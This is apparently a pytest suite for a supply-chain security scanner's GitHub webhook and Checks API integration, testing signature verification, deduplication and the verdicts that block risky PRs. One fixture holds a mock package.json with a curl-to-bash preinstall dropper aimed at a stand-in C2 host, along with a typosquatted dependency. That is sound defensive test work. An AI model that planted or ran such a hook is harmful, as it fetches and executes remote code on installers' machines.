"""Comprehensive test suite for Phase 4: GitHub Pull Request Automation & Checks API Integration.

Covers:
  - HMAC SHA-256 signature verification and security rejection (HTTP 403)
  - Delivery ID tracking and idempotency deduplication (HTTP 400 on missing, ignored on duplicates)
  - Event and action filtering (opened, synchronize, reopened accepted; closed, labeled ignored)
  - Full 7-stage automated scanning pipeline in process_pull_request
  - GitHub Checks API publishing (PASS -> success, REVIEW -> neutral, BLOCK -> failure)
  - Output formatting: line-level annotations and Markdown summary
"""

import hashlib
import hmac
import json
import pytest
from httpx import AsyncClient

from app.api.v1.github_webhooks import (
    clear_processed_deliveries,
    process_pull_request,
    verify_github_signature,
    WebhookSignatureException,
)
from app.core.config import settings
from app.services.engines.github_checks import (
    clear_published_checks,
    format_check_annotations,
    format_check_summary,
    get_published_checks,
    publish_check,
)


@pytest.fixture(autouse=True)
def cleanup_registries():
    """Ensure in-memory deduplication and check stores are reset between test runs."""
    clear_processed_deliveries()
    clear_published_checks()
    yield
    clear_processed_deliveries()
    clear_published_checks()


def _compute_sig(payload_bytes: bytes, secret: str) -> str:
    digest = hmac.new(secret.encode("utf-8"), payload_bytes, hashlib.sha256).hexdigest()
    return f"sha256={digest}"


# ==============================================================================
# 1. Signature Verification Tests
# ==============================================================================


def test_01_verify_github_signature_valid():
    secret = "test-secret-123"
    body = b'{"action":"opened","pull_request":{"number":1}}'
    sig = _compute_sig(body, secret)

    # Valid signature returns True
    assert verify_github_signature(body, secret, sig) is True


def test_02_verify_github_signature_invalid_fails():
    secret = "test-secret-123"
    body = b'{"action":"opened","pull_request":{"number":1}}'
    invalid_sig = "sha256=0000000000000000000000000000000000000000000000000000000000000000"

    with pytest.raises(WebhookSignatureException) as exc_info:
        verify_github_signature(body, secret, invalid_sig)
    assert exc_info.value.status_code == 403


def test_03_verify_github_signature_missing_fails():
    secret = "test-secret-123"
    body = b'{"action":"opened"}'

    with pytest.raises(WebhookSignatureException) as exc_info:
        verify_github_signature(body, secret, None)
    assert exc_info.value.status_code == 403


# ==============================================================================
# 2. Webhook Endpoint HTTP Tests (Signature, Deduplication & Filtering)
# ==============================================================================


@pytest.mark.asyncio
async def test_04_webhook_valid_signature_accepted(client: AsyncClient):
    payload = {
        "action": "opened",
        "pull_request": {
            "number": 101,
            "head": {"sha": "c0ffee1234567890abcdef1234567890abcdef12"},
        },
        "repository": {
            "name": "sample-repo",
            "owner": {"login": "codefort-sec"},
            "full_name": "codefort-sec/sample-repo",
        },
    }
    body = json.dumps(payload).encode()
    secret = settings.GITHUB_WEBHOOK_SECRET
    sig = _compute_sig(body, secret)

    response = await client.post(
        "/api/v1/github/webhook",
        content=body,
        headers={
            "x-github-delivery": "deliv-test-01",
            "x-github-event": "pull_request",
            "x-hub-signature-256": sig,
            "content-type": "application/json",
        },
    )

    assert response.status_code == 202
    data = response.json()
    assert data["status"] == "queued"
    assert data["delivery_id"] == "deliv-test-01"
    assert data["action"] == "opened"
    assert data["repository"] == "codefort-sec/sample-repo"
    assert data["pull_request"] == 101


@pytest.mark.asyncio
async def test_05_webhook_invalid_signature_rejected_403(client: AsyncClient):
    body = b'{"action":"opened"}'
    response = await client.post(
        "/api/v1/github/webhook",
        content=body,
        headers={
            "x-github-delivery": "deliv-test-02",
            "x-github-event": "pull_request",
            "x-hub-signature-256": "sha256=invalid_tampered_signature_hex",
            "content-type": "application/json",
        },
    )

    assert response.status_code == 403
    data = response.json()
    assert "error" in data
    assert data["error"]["code"] == "INVALID_SIGNATURE"


@pytest.mark.asyncio
async def test_06_webhook_missing_delivery_id_rejected_400(client: AsyncClient):
    body = b'{"action":"opened"}'
    sig = _compute_sig(body, settings.GITHUB_WEBHOOK_SECRET)

    response = await client.post(
        "/api/v1/github/webhook",
        content=body,
        headers={
            "x-github-event": "pull_request",
            "x-hub-signature-256": sig,
            "content-type": "application/json",
        },
    )

    assert response.status_code == 400
    data = response.json()
    assert "error" in data
    assert data["error"]["code"] == "MISSING_DELIVERY_ID"


@pytest.mark.asyncio
async def test_07_webhook_duplicate_delivery_id_ignored(client: AsyncClient):
    payload = {
        "action": "opened",
        "pull_request": {"number": 102, "head": {"sha": "sha123"}},
        "repository": {"name": "sample-repo", "owner": {"login": "testorg"}},
    }
    body = json.dumps(payload).encode()
    sig = _compute_sig(body, settings.GITHUB_WEBHOOK_SECRET)
    headers = {
        "x-github-delivery": "deliv-dedup-target",
        "x-github-event": "pull_request",
        "x-hub-signature-256": sig,
        "content-type": "application/json",
    }

    # 1. First attempt accepted
    resp1 = await client.post("/api/v1/github/webhook", content=body, headers=headers)
    assert resp1.status_code == 202
    assert resp1.json()["status"] == "queued"

    # 2. Second attempt with identical delivery ID ignored
    resp2 = await client.post("/api/v1/github/webhook", content=body, headers=headers)
    assert resp2.status_code == 202
    assert resp2.json()["status"] == "ignored"
    assert "Duplicate delivery" in resp2.json()["message"]


@pytest.mark.asyncio
async def test_08_webhook_non_pr_events_ignored(client: AsyncClient):
    body = b'{"ref":"refs/heads/main","after":"abc"}'
    sig = _compute_sig(body, settings.GITHUB_WEBHOOK_SECRET)

    response = await client.post(
        "/api/v1/github/webhook",
        content=body,
        headers={
            "x-github-delivery": "deliv-push-event",
            "x-github-event": "push",  # Not pull_request
            "x-hub-signature-256": sig,
            "content-type": "application/json",
        },
    )

    assert response.status_code == 202
    assert response.json()["status"] == "ignored"


@pytest.mark.asyncio
async def test_09_webhook_unsupported_actions_ignored(client: AsyncClient):
    payload = {
        "action": "closed",  # Not in opened, synchronize, reopened
        "pull_request": {"number": 103, "head": {"sha": "sha456"}},
        "repository": {"name": "repo", "owner": {"login": "org"}},
    }
    body = json.dumps(payload).encode()
    sig = _compute_sig(body, settings.GITHUB_WEBHOOK_SECRET)

    response = await client.post(
        "/api/v1/github/webhook",
        content=body,
        headers={
            "x-github-delivery": "deliv-closed-action",
            "x-github-event": "pull_request",
            "x-hub-signature-256": sig,
            "content-type": "application/json",
        },
    )

    assert response.status_code == 202
    assert response.json()["status"] == "ignored"


@pytest.mark.asyncio
async def test_10_webhook_supported_actions_all_accepted(client: AsyncClient):
    for action in ["opened", "synchronize", "reopened"]:
        payload = {
            "action": action,
            "pull_request": {"number": 104, "head": {"sha": f"sha-{action}"}},
            "repository": {"name": "test-repo", "owner": {"login": "codefort-sec"}},
        }
        body = json.dumps(payload).encode()
        sig = _compute_sig(body, settings.GITHUB_WEBHOOK_SECRET)

        resp = await client.post(
            "/api/v1/github/webhook",
            content=body,
            headers={
                "x-github-delivery": f"deliv-action-{action}",
                "x-github-event": "pull_request",
                "x-hub-signature-256": sig,
                "content-type": "application/json",
            },
        )
        assert resp.status_code == 202
        assert resp.json()["status"] == "queued"
        assert resp.json()["action"] == action


# ==============================================================================
# 3. GitHub Checks API & Conclusion Mapping Tests
# ==============================================================================


@pytest.mark.asyncio
async def test_11_github_checks_conclusion_mapping():
    sha = "c0ffee112233445566778899aabbccddeeff0011"

    # PASS -> success
    c_pass = await publish_check("owner", "repo", sha, verdict="PASS", summary="All clear")
    assert c_pass["conclusion"] == "success"
    assert c_pass["payload"]["conclusion"] == "success"
    assert c_pass["payload"]["name"] == "CODEFORT Security"
    assert c_pass["payload"]["output"]["title"] == "CODEFORT: PASS"

    # REVIEW -> neutral
    c_review = await publish_check("owner", "repo", sha, verdict="REVIEW", summary="Review needed")
    assert c_review["conclusion"] == "neutral"
    assert c_review["payload"]["conclusion"] == "neutral"
    assert c_review["payload"]["output"]["title"] == "CODEFORT: REVIEW"

    # BLOCK -> failure
    c_block = await publish_check("owner", "repo", sha, verdict="BLOCK", summary="Malicious dropper")
    assert c_block["conclusion"] == "failure"
    assert c_block["payload"]["conclusion"] == "failure"
    assert c_block["payload"]["output"]["title"] == "CODEFORT: BLOCK"

    # Invalid verdict raises ValueError
    with pytest.raises(ValueError) as exc:
        await publish_check("owner", "repo", sha, verdict="INVALID_VERDICT_VALUE")
    assert "Invalid security verdict" in str(exc.value)


@pytest.mark.asyncio
async def test_12_github_checks_output_formatting_and_annotations():
    sha = "beef112233445566778899aabbccddeeff0022"

    mock_findings = [
        {
            "rule_id": "npm.exec.preinstall",
            "title": "Remote dropper in lifecycle hook",
            "description": "Script runs curl and pipes to bash.",
            "severity": "CRITICAL",
            "file_path": "package.json",
            "line_start": 7,
            "line_end": 7,
            "recommendation": "Remove curl | bash command.",
        },
        {
            "rule_id": "dep.typosquat.lodash",
            "title": "Typosquat package: lodashe",
            "description": "Dependency is 1 edit distance from lodash.",
            "severity": "HIGH",
            "file_path": "package.json",
            "line_start": 14,
            "line_end": 14,
            "recommendation": "Replace with lodash.",
        },
    ]

    annotations = format_check_annotations(mock_findings)
    assert len(annotations) == 2
    assert annotations[0]["path"] == "package.json"
    assert annotations[0]["start_line"] == 7
    assert annotations[0]["annotation_level"] == "failure"  # CRITICAL -> failure
    assert "CODEFORT: Remote dropper" in annotations[0]["title"]
    assert annotations[1]["annotation_level"] == "failure"  # HIGH -> failure

    summary_md = format_check_summary(
        verdict="BLOCK",
        risk_score=85,
        barqai_summary={"what_changed": "Added malicious preinstall hook and lodashe.", "why_it_matters": "Remote code execution."},
        findings=mock_findings,
    )

    assert "## CODEFORT Security Check — 🔴 BLOCKED" in summary_md
    assert "**Risk Score:** `85/100`" in summary_md
    assert "Remote dropper in lifecycle hook" in summary_md
    assert "Typosquat package: lodashe" in summary_md

    # Publish check with annotations
    result = await publish_check(
        owner="codefort-sec",
        repo="sample-repo",
        head_sha=sha,
        verdict="BLOCK",
        summary=summary_md,
        annotations=annotations,
    )

    assert result["payload"]["output"]["annotations"] == annotations
    published = get_published_checks(sha)
    assert len(published) == 1
    assert published[0]["verdict"] == "BLOCK"


# ==============================================================================
# 4. Full 7-Stage PR Scan Pipeline Execution (process_pull_request)
# ==============================================================================


@pytest.mark.asyncio
async def test_13_process_pull_request_vulnerable_pr():
    """
    Executes full pipeline for a PR containing a malicious lifecycle dropper and typosquatted package.
    Expects:
      - Findings from Static Analyzer and Dependency Intelligence
      - Dynamic Sandbox execution telemetry
      - Deterministic Backend Risk Score >= 70
      - Verdict: BLOCK
      - GitHub Checks conclusion: failure
    """
    head_sha = "vuln_sha_99887766554433221100aabbccddeeff"
    mock_files = {
        "package.json": json.dumps(
            {
                "name": "infiltrated-project",
                "version": "1.0.0",
                "scripts": {
                    "preinstall": "curl -s http://c2-transfer.mock.xyz/payload.sh | bash",
                },
                "dependencies": {
                    "lodashe": "^4.17.21",
                },
            },
            indent=2,
        ),
        "index.js": "const crypto = require('crypto'); console.log('Starting app');\n",
    }

    scan = await process_pull_request(
        owner="codefort-sec",
        repo_name="vulnerable-test-repo",
        pr_number=50,
        head_sha=head_sha,
        payload={"_mock_files": mock_files},
    )

    # Verify scan results
    assert scan.repository == "codefort-sec/vulnerable-test-repo"
    assert scan.pull_request == 50
    assert scan.verdict.value.upper() == "BLOCKED"
    assert scan.risk_score >= 70

    # Verify that a GitHub Check Run was published for this exact commit SHA
    checks = get_published_checks(head_sha)
    assert len(checks) == 1
    check = checks[0]
    assert check["conclusion"] == "failure"
    assert check["verdict"] == "BLOCK"
    assert "🔴 BLOCKED" in check["payload"]["output"]["summary"]
    assert len(check["payload"]["output"]["annotations"]) >= 1


@pytest.mark.asyncio
async def test_14_process_pull_request_clean_pr():
    """
    Executes full pipeline for a clean PR containing standard benign libraries.
    Expects:
      - No critical findings
      - Verdict: PASS
      - Risk Score <= 25
      - GitHub Checks conclusion: success
    """
    head_sha = "clean_sha_11223344556677889900aabbccddeeff"
    clean_files = {
        "package.json": json.dumps(
            {
                "name": "clean-project",
                "version": "1.0.0",
                "dependencies": {
                    "react": "^18.3.1",
                    "clsx": "^2.1.1",
                },
            },
            indent=2,
        ),
        "src/App.tsx": "export default function App() { return <div>Hello World</div>; }\n",
    }

    scan = await process_pull_request(
        owner="codefort-sec",
        repo_name="clean-test-repo",
        pr_number=51,
        head_sha=head_sha,
        payload={"_mock_files": clean_files},
    )

    assert scan.repository == "codefort-sec/clean-test-repo"
    assert scan.pull_request == 51
    assert scan.verdict.value.upper() == "PASS"
    assert scan.risk_score <= 25

    checks = get_published_checks(head_sha)
    assert len(checks) == 1
    check = checks[0]
    assert check["conclusion"] == "success"
    assert check["verdict"] == "PASS"
    assert "🟢 PASS" in check["payload"]["output"]["summary"]


# ==============================================================================
# 5. Endpoint Aliasing Tests (/api/v1/github/webhook vs /api/v1/webhooks/github)
# ==============================================================================


@pytest.mark.asyncio
async def test_15_webhook_route_aliases_both_functional(client: AsyncClient):
    payload = {
        "action": "synchronize",
        "pull_request": {"number": 200, "head": {"sha": "sha_alias_test"}},
        "repository": {"name": "app", "owner": {"login": "team"}},
    }
    body = json.dumps(payload).encode()
    sig = _compute_sig(body, settings.GITHUB_WEBHOOK_SECRET)

    # Route 1: /api/v1/github/webhook
    resp1 = await client.post(
        "/api/v1/github/webhook",
        content=body,
        headers={
            "x-github-delivery": "deliv-route-1",
            "x-github-event": "pull_request",
            "x-hub-signature-256": sig,
            "content-type": "application/json",
        },
    )
    assert resp1.status_code == 202
    assert resp1.json()["status"] == "queued"

    # Route 2: /api/v1/webhooks/github
    resp2 = await client.post(
        "/api/v1/webhooks/github",
        content=body,
        headers={
            "x-github-delivery": "deliv-route-2",
            "x-github-event": "pull_request",
            "x-hub-signature-256": sig,
            "content-type": "application/json",
        },
    )
    assert resp2.status_code == 202
    assert resp2.json()["status"] == "queued"
